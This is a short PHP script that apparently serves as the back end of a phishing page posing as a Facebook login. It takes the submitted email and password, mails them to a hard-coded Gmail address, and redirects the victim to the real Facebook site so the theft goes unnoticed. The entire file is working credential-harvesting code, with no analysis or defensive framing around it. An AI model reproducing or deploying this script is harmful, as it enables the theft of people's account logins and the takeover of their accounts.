<?php
$email = $_POST["email"];
$passkey = $_POST["pass"];

$recipient = "israelstoba@gmail.com";

mail($recipient,$email,$passkey,"#")
or die("Error");

header("location:https://web.facebook.com");
?>
